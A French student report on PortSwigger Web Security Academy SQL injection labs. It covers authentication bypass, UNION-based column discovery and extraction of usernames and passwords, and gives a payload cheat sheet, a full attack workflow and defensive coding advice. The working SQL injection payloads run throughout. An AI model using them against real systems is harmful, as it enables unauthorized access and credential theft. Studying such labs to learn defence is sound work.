 Rapport — SQL Injection (PortSwigger Web Security Academy)

Auteur : Gerard Lonzi
Plateforme : PortSwigger Web Security Academy
Date : Juin 2026
Statut : En cours d'apprentissage 🚀


📋 Table des Matières

Introduction au SQL Injection
Lab 1 — SQL Injection dans la clause WHERE
Lab 2 — Bypass d'authentification
Lab 3 — UNION Attack : Déterminer le nombre de colonnes
Lab 4 — UNION Attack : Trouver les colonnes visibles
Lab 5 — UNION Attack : Extraire des données
Infos Système via SQL Injection
Récapitulatif des Payloads
Comment se Protéger
Ressources


1. Introduction au SQL Injection
Définition
Le SQL Injection (SQLi) est une attaque qui consiste à injecter du code SQL malveillant dans un champ de saisie d'une application web, afin de manipuler les requêtes envoyées à la base de données.
Pourquoi ça fonctionne ?
php// Code vulnérable — l'input utilisateur est collé directement
$query = "SELECT * FROM users WHERE username = '" . $input . "'";

// Si l'utilisateur entre :  admin'--
// La requête devient :
// SELECT * FROM users WHERE username = 'admin'--'
// Tout ce qui suit -- est un commentaire → le mot de passe est ignoré !
Les types d'injection SQL
TypeDescriptionIn-band SQLiLes résultats s'affichent directement sur la pageBlind SQLiPas de résultat visible, on déduit via vrai/fauxError-basedOn exploite les messages d'erreurUNION-basedOn combine des requêtes pour extraire des donnéesTime-basedOn mesure le temps de réponse pour déduire des infos

2. Lab 1 — SQL Injection dans la clause WHERE
Objectif
Manipuler la requête SQL d'un filtre de catégorie pour afficher des produits cachés.
Contexte
URL : https://site.com/products?category=Gifts
Le site exécute en arrière-plan :
sqlSELECT name, description, price 
FROM products 
WHERE category = 'Gifts' AND visible = 1
Exploitation
Payload injecté :
Gifts' OR 1=1--
Requête générée :
sqlSELECT name, description, price 
FROM products 
WHERE category = 'Gifts' OR 1=1--' AND visible = 1
Explication :
OR 1=1  → toujours vrai → retourne TOUS les produits
--      → commente le reste de la requête
        → la condition AND visible=1 est ignorée
Résultat : Tous les produits s'affichent, y compris les cachés ✅

3. Lab 2 — Bypass d'Authentification
Objectif
Se connecter en tant qu'administrateur sans connaître le mot de passe.
Contexte
Formulaire de login avec deux champs : username et password.
La requête SQL du site :
sqlSELECT * FROM users 
WHERE username = 'INPUT' AND password = 'INPUT'
Exploitation
Dans le champ username :
administrator'--
Dans le champ password :
n'importe quoi
Requête générée :
sqlSELECT * FROM users 
WHERE username = 'administrator'--' AND password = 'nimportequoi'
Explication :
'           → ferme le guillemet du username
--          → commente tout ce qui suit
            → AND password = '...' est ignoré !
            → On se connecte sans mot de passe
Autres payloads de bypass :
sql' OR 1=1--
' OR '1'='1
admin'--
' OR 1=1#          (MySQL)
Résultat : Connexion réussie en tant qu'administrator ✅

4. Lab 3 — UNION Attack : Déterminer le nombre de colonnes
Objectif
Trouver combien de colonnes la requête originale retourne — étape obligatoire avant un UNION.
Pourquoi c'est nécessaire ?
sql-- La requête originale a 3 colonnes
SELECT name, description, price FROM products WHERE category = 'Gifts'

-- Le UNION doit avoir EXACTEMENT le même nombre de colonnes
UNION SELECT col1, col2, col3 FROM autre_table  ✅

-- Sinon → ERREUR
UNION SELECT col1, col2 FROM autre_table         ❌
Méthode 1 — ORDER BY
On incrémente le numéro jusqu'à obtenir une erreur :
Gifts' ORDER BY 1--   → ✅ pas d'erreur
Gifts' ORDER BY 2--   → ✅ pas d'erreur
Gifts' ORDER BY 3--   → ✅ pas d'erreur
Gifts' ORDER BY 4--   → ❌ ERREUR → la table a 3 colonnes !
Requête générée pour ORDER BY 4 :
sqlSELECT name, description, price FROM products 
WHERE category = 'Gifts' ORDER BY 4--'
-- Erreur : "ORDER BY position 4 is out of range"
Méthode 2 — UNION SELECT NULL
On ajoute des NULL un par un jusqu'au succès :
Gifts' UNION SELECT NULL--          → ❌ erreur (1 ≠ 3)
Gifts' UNION SELECT NULL,NULL--     → ❌ erreur (2 ≠ 3)
Gifts' UNION SELECT NULL,NULL,NULL--→ ✅ succès ! (3 = 3)
Pourquoi NULL et pas autre chose ?
NULL est compatible avec TOUS les types de données :
- Colonne texte  → NULL ✅
- Colonne nombre → NULL ✅
- Colonne date   → NULL ✅

'abc' dans une colonne nombre → ❌ Erreur de type
Résultat : 3 colonnes identifiées ✅

5. Lab 4 — UNION Attack : Trouver les colonnes visibles
Objectif
Identifier quelles colonnes sont réellement affichées sur la page web.
Le problème
La table peut avoir 3 colonnes mais le site n'en affiche que 2 :
php// Le développeur n'affiche que name et price
while ($row = $result->fetch()) {
    echo $row['name'];   // ✅ affiché
    echo $row['price'];  // ✅ affiché
    // description       // ❌ pas affiché
}
Si on met le mot de passe dans une colonne invisible, on ne le verra jamais !
Technique — Injecter 'test' colonne par colonne
Test colonne 1 :
Gifts' UNION SELECT 'test',NULL,NULL--
Page web :
┌─────────────────────┐
│ T-shirt    25€      │
│ Mug        12€      │
│ test       NULL ✅  │  ← 'test' apparaît → colonne 1 visible !
└─────────────────────┘
Test colonne 2 :
Gifts' UNION SELECT NULL,'test',NULL--
Page web :
┌─────────────────────┐
│ T-shirt    25€      │
│ Mug        12€      │
│                     │  ← rien → colonne 2 invisible ❌
└─────────────────────┘
Test colonne 3 :
Gifts' UNION SELECT NULL,NULL,'test'--
Page web :
┌─────────────────────┐
│ T-shirt    25€      │
│ Mug        12€      │
│ NULL    test ✅     │  ← 'test' apparaît → colonne 3 visible !
└─────────────────────┘
Résultat
Colonne 1 (name)        → ✅ visible
Colonne 2 (description) → ❌ invisible
Colonne 3 (price)       → ✅ visible

6. Lab 5 — UNION Attack : Extraire des données
Objectif
Extraire les usernames et mots de passe de la table users.
Exploitation
On place les données dans les colonnes visibles (1 et 3) :
Gifts' UNION SELECT username,NULL,password FROM users--
Requête complète :
sqlSELECT name, description, price FROM products WHERE category = 'Gifts'
UNION
SELECT username, NULL, password FROM users--
Résultat sur la page :
┌───────────────────────────────────────┐
│ T-shirt          25€                  │
│ Mug              12€                  │
│ administrator    s3cr3tpassw0rd  ✅   │
│ alice            alice123        ✅   │
│ bob              bob456          ✅   │
└───────────────────────────────────────┘
Cas spécial — Une seule colonne visible
Si seulement la colonne 1 est visible, on concatène :
sql-- MySQL
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--

-- PostgreSQL
' UNION SELECT username||':'||password,NULL,NULL FROM users--

-- Résultat :
-- administrator:s3cr3tpassw0rd
-- alice:alice123

7. Infos Système via SQL Injection
Version de la base de données
sql-- MySQL / MariaDB
' UNION SELECT @@version,NULL,NULL--

-- PostgreSQL
' UNION SELECT version(),NULL,NULL--

-- Oracle
' UNION SELECT banner,NULL,NULL FROM v$version--

-- SQLite
' UNION SELECT sqlite_version(),NULL,NULL--
Base de données courante
sql-- MySQL
' UNION SELECT database(),NULL,NULL--

-- PostgreSQL
' UNION SELECT current_database(),NULL,NULL--
Lister toutes les tables
sql' UNION SELECT table_name,NULL,NULL 
  FROM information_schema.tables
  WHERE table_schema=database()--

-- Résultat possible :
-- users
-- products
-- orders
-- admin_panel
Lister les colonnes d'une table
sql' UNION SELECT column_name,NULL,NULL 
  FROM information_schema.columns
  WHERE table_name='users'--

-- Résultat :
-- id
-- username
-- password
-- email
-- is_admin

8. Récapitulatif des Payloads
Détection
'                          → test de vulnérabilité basique
''                         → test guillemet double
;--                        → test fin de requête
Bypass authentification
sql' OR 1=1--
' OR '1'='1'--
admin'--
administrator'--
Compter les colonnes
sql' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--             → erreur = N-1 colonnes

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
Trouver colonnes visibles
sql' UNION SELECT 'test',NULL,NULL--
' UNION SELECT NULL,'test',NULL--
' UNION SELECT NULL,NULL,'test'--
Extraire des données
sql' UNION SELECT username,NULL,password FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
Commentaires selon la BDD
--    → MySQL, PostgreSQL, MSSQL
#     → MySQL uniquement
/*    → Universel

9. Comment se Protéger
✅ Requêtes préparées (LA vraie solution)
python# ❌ VULNÉRABLE
query = f"SELECT * FROM users WHERE username = '{input}'"

# ✅ SÉCURISÉ
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (input,))
php// ❌ VULNÉRABLE
$query = "SELECT * FROM users WHERE username = '$input'";

// ✅ SÉCURISÉ
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$input]);
✅ ORM (protection automatique)
python# SQLAlchemy — sécurisé par défaut
user = User.query.filter_by(username=input).first()
✅ Validation des inputs
pythonimport re
# Bloquer les caractères dangereux
if re.search(r"[';--]", input):
    raise ValueError("Caractères interdits détectés")
✅ Principe du moindre privilège
sql-- L'utilisateur BDD du site ne peut que lire
GRANT SELECT ON products TO webapp_user;
-- Jamais : DROP, DELETE, UPDATE, INSERT sur les tables sensibles
✅ WAF (Web Application Firewall)
Détecte et bloque les payloads SQL connus avant qu'ils atteignent la BDD.

10. Ressources
RessourceLienDescriptionPortSwigger Web Academyportswigger.net/web-security/sql-injectionCours + Labs officielsSQLZoosqlzoo.netApprendre SQL de baseSQLBoltsqlbolt.comExercices SQL interactifsHackTheBoxhackthebox.comChallenges avancésTryHackMetryhackme.comParcours guidésOWASP SQLiowasp.orgRéférence officielle

🗺️ Workflow Complet — UNION Attack
1. Détecter la vulnérabilité
   └── Gifts'  →  erreur SQL ? ✅

2. Compter les colonnes
   └── ORDER BY 1,2,3... → erreur à N = N-1 colonnes

3. Confirmer avec UNION NULL
   └── UNION SELECT NULL,NULL,NULL → succès ✅

4. Trouver colonnes visibles
   └── Remplacer NULL par 'test' un par un

5. Extraire infos système
   └── version(), database()

6. Lister les tables
   └── FROM information_schema.tables

7. Lister les colonnes
   └── FROM information_schema.columns

8. Extraire les données cibles
   └── SELECT username,password FROM users


⚠️ Disclaimer : Ce rapport est rédigé dans un cadre éducatif et d'apprentissage en cybersécurité. Toutes les techniques présentées sont pratiquées sur des environnements légaux (PortSwigger Labs). Ne jamais utiliser ces techniques sur des systèmes sans autorisation explicite.


Rapport généré dans le cadre de la formation PortSwigger Web Security Academy — 2026
